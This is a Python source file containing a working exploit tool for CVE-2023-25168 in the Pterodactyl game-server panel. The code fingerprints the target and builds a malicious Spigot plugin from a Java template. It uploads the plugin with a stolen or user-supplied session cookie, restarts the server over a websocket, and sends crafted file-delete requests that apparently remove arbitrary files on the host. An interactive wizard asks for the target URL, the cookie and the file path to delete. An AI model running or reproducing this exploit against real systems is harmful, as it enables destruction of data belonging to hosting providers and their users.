# For target requests
import requests
import http
import websocket
import json
import urllib

# For CSRF token reading
import html.parser

# For payload generation and pushing
import subprocess
import sys
import os
import shutil

# Other utilities.
import contextlib
import typing
import concurrent.futures
import threading
import rel
import signal
import collections.abc


# Debug usage
import socks
import socket


@contextlib.contextmanager
def tmp_chdir(target_dir: str):
   old_dir = os.getcwd()
   os.chdir(target_dir)
   try:
       yield
   finally:
       os.chdir(old_dir)


class ExploitFail(Exception):
    pass

class PterodactylWebsocketController(threading.Thread):
    def __init__(self, url: str, token: str, session_obj: requests.session, origin_url: str):
        threading.Thread.__init__(self)

        self.__app = websocket.WebSocketApp(url, on_message=self.__on_msg, on_open=self.__authenticate)
        cookie_dict = session_obj.cookies.get_dict(domain=urllib.parse.urlparse(origin_url).hostname)
        self.__app.cookie = '; '.join(['%s=%s' % (name, value) for (name, value) in cookie_dict.items()])
        self.__token = token
        self.daemon = True
        self.__future = concurrent.futures.Future()
        self.__app.run_forever(dispatcher=rel, reconnect=5, origin=origin_url[:-1])

    def __on_msg(self, ws_client: websocket.WebSocketApp, data: bytes) -> None:
        parsed = json.loads(data)
        self.__future.set_result(parsed)

    def __wait(self, condition: typing.Callable[[dict], bool]):
        while not condition(self.__future.result(timeout=1919810)):
            self.__future = concurrent.futures.Future()
            pass
        self.__future = concurrent.futures.Future()
    def __authenticate(self, ws_client: websocket.WebSocketApp) -> None:
        auth_request = {"event": "auth", "args": [self.__token]}
        self.__app.send(json.dumps(auth_request))
    def wait_auth(self):
        def check_success(data: dict) -> bool:
            return data["event"] == "auth success"
        self.__wait(check_success)

    def run(self):
        rel.dispatch()

    def issue_reboot(self):
        reboot_request = {"event": "set state", "args": ["restart"]}
        self.__app.send(json.dumps(reboot_request))

    def wait_reboot(self):
        def check_stopped(data: dict) -> bool:
            return data["event"] == "status" and data["args"][0] == "offline"
        def check_started(data: dict) -> bool:
            return data["event"] == "status" and data["args"][0] == "running"
        self.__wait(check_stopped)
        self.__wait(check_started)

    def __del__(self):
        self.__app.close()
        rel.abort()


class ExploitSession:
    def __init__(self, url: str, cookie: str | http.cookiejar.CookieJar, ignore_fingerprint: bool = False):
        if not isinstance(url, str):
            raise TypeError("Unidentified target.")
        if not isinstance(cookie, str) and not isinstance(cookie, http.cookiejar.CookieJar):
            raise TypeError("Invalid cookie for logging in")
    
        session_obj = requests.session()
        
        if isinstance(cookie, str):
            cookie = self.__wrap_cookie(cookie)
    
        session_obj.cookies = cookie
        if "XSRF-TOKEN" in session_obj.cookies:
            session_obj.cookies.pop("XSRF-TOKEN")

        self.__headers = {}
        try:
            with session_obj.get(url) as response:
                if b"Pterodactyl" not in response.content and not ignore_fingerprint:
                    raise ExploitFail("Target does not seem to be a valid Pterodactyl server provider. If you are sure target is a Pterodactyl server provider, set `ignore_fingerprint` to True in the argument.")
                self.__update_xsrf_token(response.cookies)
        except Exception as e:
            raise ExploitFail("Check fail.") from e

        self.__base_url = url if url.endswith('/') else url + '/'
        self.__requests_session = session_obj

        self.resolve_payload_dependency = self.__default_payload_dependency_resolver
        self.generate_payload = self.__default_payload_generator
        self.cleanup = self.__default_cleaner
        self.files = []
        self.payload_target_dir = "/plugins"
        self.websocketFuture = concurrent.futures.Future()

    def __update_xsrf_token(self, cookies) -> None:
        try:
            self.__headers["X-XSRF-TOKEN"] = cookies.get("XSRF-TOKEN")
            self.__headers["X-Requested-With"] = "XMLHttpRequest"
        except KeyError:
            pass

    def __wrap_cookie(self, cookie: str) -> http.cookiejar.CookieJar:
        c = http.cookies.SimpleCookie(cookie)
        result = requests.cookies.RequestsCookieJar()
        result.update(c)
        return result

    @contextlib.contextmanager
    def __execute_request(self, url: str, method: str, **kwargs) -> collections.abc.Generator[requests.Response, None, None]:
        func = getattr(self.__requests_session, method)
        if not isinstance(func, typing.Callable):
            raise ValueError("Invalid method.")
        headers = kwargs.get("headers") or {}
        headers = headers | self.__headers
        kwargs["headers"] = headers
        res = func(url, **kwargs)
        self.__update_xsrf_token(res.cookies)
        yield res

    def __default_cleaner(self, files: list, ws: PterodactylWebsocketController, done: bool = False):
        if ws is not None:
            del ws
        
        raise KeyboardInterrupt

    def exploit(self, server_id: str) -> None:
        if not isinstance(server_id, str):
            raise TypeError("Id of server should be a string")
        if not isinstance(self.resolve_payload_dependency, typing.Callable):
            raise ValueError("Payload dependency resolver is not valid")
        if not isinstance(self.generate_payload, typing.Callable):
            raise ValueError("Payload generator is not valid")
        if not isinstance(self.files, list):
            raise ValueError("File dictionary is not a list")

        organized_files = self.__organize_files()

        payload_file = self.generate_payload(organized_files)
        ws = None

        def __keyboard():
            rel.abort()
            raise KeyboardInterrupt

        signal.signal(signal.SIGINT, __keyboard)
        signal.signal(signal.SIGTERM, __keyboard)

        try:
            with open(payload_file[0], "rb") as payload:
                with self.__execute_request(self.__base_url + "api/client/servers/" + server_id + "/files/upload", method='get') as up1:
                    up1.raise_for_status()
                    url = up1.json()["attributes"]["url"]
                    with self.__execute_request(url + "&directory=" + self.payload_target_dir, headers={"Access-Control-Request-Method": "POST"}, method='options') as up2:
                        up2.raise_for_status()
                    with self.__execute_request(url + "&directory=" + self.payload_target_dir, files={"files": payload}, method='post') as up3:
                        up3.raise_for_status()

            with self.__execute_request(self.__base_url + "api/client/servers/" + server_id + "/websocket", method='get') as r:
                data = r.json()["data"]
                token = str(data["token"])
                ws_socket = str(data["socket"])
                ws = PterodactylWebsocketController(ws_socket, token, self.__requests_session, self.__base_url)
                ws.start()
                ws.wait_auth()
                ws.issue_reboot()
                ws.wait_reboot()

            # Delete files.
            simplified_server_id = server_id.split('-')[0]
            fileedit_url = self.__base_url + 'server/' + simplified_server_id + "/files/"
            for index, (directory, file_list) in enumerate(organized_files.items()):
                with self.__execute_request(fileedit_url, method='get') as r:
                    r.raise_for_status()
                    csrf_token_storage = {}
                    class Parser0(html.parser.HTMLParser):
                        def handle_starttag(self, tag, attrs):
                            if tag == "meta" and attrs[0][0] == "name" and attrs[0][1] == "csrf-token" and attrs[1][0] == "content":
                                # Writing the variable directly does not seem to work here.
                                csrf_token_storage['token'] = attrs[1][1]
                      
                    Parser0().feed(r.text)
                        
                    payload_dict = {}
                    payload_dict['root'] = "_link_" + str(index) + "_link_"
                    payload_dict['files'] = file_list

                    with self.__execute_request(self.__base_url + "api/client/servers/" + server_id + "/files/delete", data=json.dumps(payload_dict), headers={"Referer": fileedit_url, "X-CSRF-TOKEN": csrf_token_storage['token'], "Content-Type": "application/json"}, method='post') as r:
                        r.raise_for_status()

        except Exception as e:
            raise ExploitFail("Failed to exploit") from e
        finally:
            del ws
            shutil.rmtree("payload")
            for f in payload_file:
                if os.path.isdir(f):
                    shutil.rmtree(f)
                else:
                    os.remove(f)

    # Have no better form of this method for now. Feel free to PR if you have some better idea.
    def __organize_files(self) -> dict:
        res = {}
        for target in self.files:
            dirname = os.path.dirname(target)
            if dirname not in res:
                res[dirname] = []
            res[dirname].append(os.path.basename(target))
        return res

    def push_file(self, target_file: str) -> None:
        if not isinstance(self.files, list):
            raise ValueError("File list is not a list")
        if not isinstance(target_file, str):
            raise TypeError("Invalid target")
        
        self.files.append(target_file)
    
    def __default_payload_dependency_resolver(self) -> str:
        if os.path.isfile("spigot.jar"):
            return "spigot.jar"
        with requests.get("https://hub.spigotmc.org/nexus/content/groups/public/org/spigotmc/spigot-api/1.19.3-R0.1-SNAPSHOT/spigot-api-1.19.3-R0.1-20230216.085020-44.jar", stream=True) as r:
            r.raise_for_status()
            with open("spigot.jar", "wb") as spigot_jar:
                for chunk in r.iter_content(chunk_size=8192):
                    spigot_jar.write(chunk)
        return "spigot.jar"

    def __default_payload_generator(self, organized_files: dict) -> list:
        # Generate payload source.
        os.mkdir("payload")
        dependency_file = os.path.abspath(self.resolve_payload_dependency())
        if not isinstance(dependency_file, str):
            raise ValueError("Resolved dependency file should be a string")

        payload_tmp_abs_path = os.getcwd() + "/payload"
        with tmp_chdir(os.path.dirname(os.path.abspath(__file__))):
           os.makedirs(payload_tmp_abs_path + "/moe/orangemc/cve_2023_25168")
           try:
                with open("template.java", "r") as template_source:
                   with open(payload_tmp_abs_path + "/moe/orangemc/cve_2023_25168/CVE_2023_25168.java", "w") as target_source:
                       target_source.write(template_source.read().replace("/*TARGET_PLACEHOLDER*/", '"' + '","'.join(organized_files.keys()) + '"'))
                with open("plugin.yml", "r") as template_yml:
                   with open(payload_tmp_abs_path + "/plugin.yml", "w") as target_yml:
                       target_yml.write(template_yml.read())
           except Exception as e:
               raise ValueError("Please ensure template java source code and plugin.yml is in " + os.getcwd()) from e

        with tmp_chdir("payload"):
            try:
                subprocess.check_call([' '.join(["javac", "-cp", dependency_file, "moe/orangemc/cve_2023_25168/CVE_2023_25168.java"])], shell=True)
            except Exception as e:
                raise ExploitFail("Failed to create compiliation process") from e
        try:
            subprocess.check_call([' '.join(["jar", "cf", "CVE-2023-25168.jar", "-C", "payload", "."])], shell=True)
        except Exception as e:
            raise ExploitFail("Failed to package the payload into a jar") from e
            
        return ["CVE-2023-25168.jar", dependency_file]

def wizard():
    server_url = input("Please input the base server url: ")
    cookie = input("Your cookie in target website: ")
    server_id = input("Your server id: ")
    target = input("Target file to delete, in absolute path: ")
    sesssion = ExploitSession(server_url, cookie)
    sesssion.push_file(target)
    sesssion.exploit(server_id)

if __name__ == "__main__":
    wizard()

